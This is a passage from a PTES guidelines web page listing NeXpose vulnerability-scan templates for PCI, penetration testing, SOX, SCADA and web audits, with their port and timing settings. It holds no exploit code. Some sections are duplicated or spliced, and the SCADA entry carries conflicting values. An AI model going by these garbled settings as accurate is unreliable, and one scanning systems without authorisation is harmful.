<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;Use this template to scan assets as part of
a PCI compliance program.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;22, 23, 25, 80, 443</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;All possible (1-65535)</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;1 ms send delay, 5 blocks, 15 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;Policy check types</p>
</div>
<div class="section" id="penetration-test">
<h2>Penetration test<a class="headerlink" href="#penetration-test" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This in-depth scan of all systems uses only safe
checks. Host-discovery and network penetration features allow NeXpose to
dynamically detect assets that might not otherwise be detected. NeXpose
does not perform in-depth patch/hotfix checking, policy compliance
checking, or application-layer auditing .</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;With this template, you may discover assets
that are out of your initial scan scope. Also, running a scan with this
template is helpful as a precursor to conducting formal penetration test
procedures.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;21, 22, 23, 25, 80, 443, 8080</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;NeXpose determines optimal method</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;21, 23, 25, 80, 110, 111, 135, 139, 443, 445,
449, 8080</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well known numbers + 1-1040</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;Local, patch, policy check
types</p>
</div>
<div class="section" id="id101">
<h2>Penetration test<a class="headerlink" href="#id101" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This in-depth scan of all systems uses only safe
checks. Host-discovery and network penetration features allow NeXpose to
dynamically detect assets that might not otherwise be detected. NeXpose
does not perform in-depth patch/hotfix checking, policy compliance
checking, or application-layer auditing.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;With this template, you may discover assets
that are out of your initial scan scope. Also, running a scan with this
template is helpful as a precursor to conducting formal penetration test
procedures.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;21, 22, 23, 25, 80, 443, 8080</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;NeXpose determines optimal method</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;21, 23, 25, 80, 110, 111, 135, 139, 443, 445,
449, 8080</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well known numbers + 1-1040</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;Local, patch, policy check
types</p>
</div>
<div class="section" id="safe-network-audit">
<h2>Safe network audit<a class="headerlink" href="#safe-network-audit" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This non-intrusive scan of all network assets uses
only safe checks. NeXpose does not perform in-depth patch/hotfix
checking, policy compliance checking, or application-layer auditing.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;This template is useful for a quick,
general scan of your network.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;80</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well known numbers + 1-1040</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p><strong>Specific vulnerability checks enabled (which disables all other
checks)</strong>: None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;Local, patch, policy check
types</p>
</div>
<div class="section" id="sarbanes-oxley-sox-compliance">
<h2>Sarbanes-Oxley (SOX) compliance<a class="headerlink" href="#sarbanes-oxley-sox-compliance" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This is a safe-check</p>
<p>Sarbanes-Oxley (SOX) audit of all systems. It detects threats to digital
data integrity, data access auditing, accountability, and availability,
as mandated in Section 302 (&#8220;Corporate Responsibility for Fiscal
Reports&#8221;), Section 404 (&#8220;Management Assessment of Internal Controls&#8221;),
and Section 409 (&#8220;Real Time Issuer Disclosures&#8221;) respectively.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;Use this template to scan assets as part of
a SOX compliance program.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;80</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well known numbers + 1-1040</p>
</div>
<div class="section" id="scada-audit">
<h2>SCADA audit<a class="headerlink" href="#scada-audit" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This is a &#8220;polite,&#8221; or less aggressive, network audit
of sensitive Supervisory Control And Data Acquisition (SCADA) systems,
using only safe checks. Packet block delays have been increased; time
between sent packets has been increased; protocol handshaking has been
disabled; and simultaneous network access to assets has been restricted.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;Use this template to scan SCADA systems.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;10 ms send delay, 3 retries, 2000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well known numbers + 1-1040</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;10 ms send delay, 10 blocks, 10 ms
block delay, 4 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: <strong>Policy check type</strong>TCP
port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block delay,
5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;None</p>
</div>
<div class="section" id="web-audit">
<h2>Web audit<a class="headerlink" href="#web-audit" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This audit of all Web servers and Web applications is
suitable public-facing and internal assets, including application
servers, ASP&#8217;s, and CGI scripts. NeXpose does not perform patch checking
or policy compliance audits. Nor does it scan FTP servers, mail servers,
or database servers, as is the case with the DMZ Audit scan template.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;Use this template to scan public-facing Web
assets.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;N</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;Web category check</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;None</p>
</div>
</div>


           </div>
          </div>
          <footer>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2016, The PTES Team.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'./',
            VERSION:'1.1',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true
        };
    </script>
      <script type="text/javascript" src="_static/jquery.js"></script>
      <script type="text/javascript" src="_static/underscore.js"></script>
      <script type="text/javascript" src="_static/doctools.js"></script>

  

  
  
    <script type="text/javascript" src="_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>